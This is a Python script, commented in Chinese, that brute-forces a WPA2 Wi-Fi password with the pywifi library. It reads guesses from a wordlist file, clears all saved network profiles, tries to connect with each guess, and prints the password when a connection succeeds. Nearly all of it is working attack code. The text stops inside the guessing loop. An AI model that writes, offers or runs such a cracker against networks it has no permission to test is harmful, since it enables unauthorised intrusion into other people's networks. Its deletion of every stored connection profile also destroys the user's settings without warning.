import pywifi
import time
from pywifi import const


# 破解模块
def wifi_password_crack(wifi_name):
    # 字典路径
    wifi_dic_path = r'./a.txt'
    with open(wifi_dic_path, 'r') as f:
        # 遍历密码
        for pwd in f:
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')

            # 创建wifi对象
            wifi = pywifi.PyWiFi()
            # 创建网卡对象，为第一个wifi网卡
            interface = wifi.interfaces()[0]
            # 断开所有wifi连接
            interface.disconnect()
            # 等待其断开
            while interface.status() == 4:
                # 当其处于连接状态时，利用循环等待其断开
                pass

            # 创建连接文件（对象）
            profile = pywifi.Profile()
            # wifi名称
            profile.ssid = wifi_name
            # 需要认证
            profile.auth = const.AUTH_ALG_OPEN
            # wifi默认加密算法
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            # wifi密码
            profile.key = pwd
            # 删除所有wifi连接文件
            interface.remove_all_network_profiles()
            # 设置新的wifi连接文件
            tmp_profile = interface.add_network_profile(profile)

            # 开始尝试连接
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接）
                if interface.status() == 4:
                    print(f'\r连接成功！密码为：{pwd}')
                    return
                else:
                    print(f'\r正在利用密码 {pwd} 尝试破解。', end='')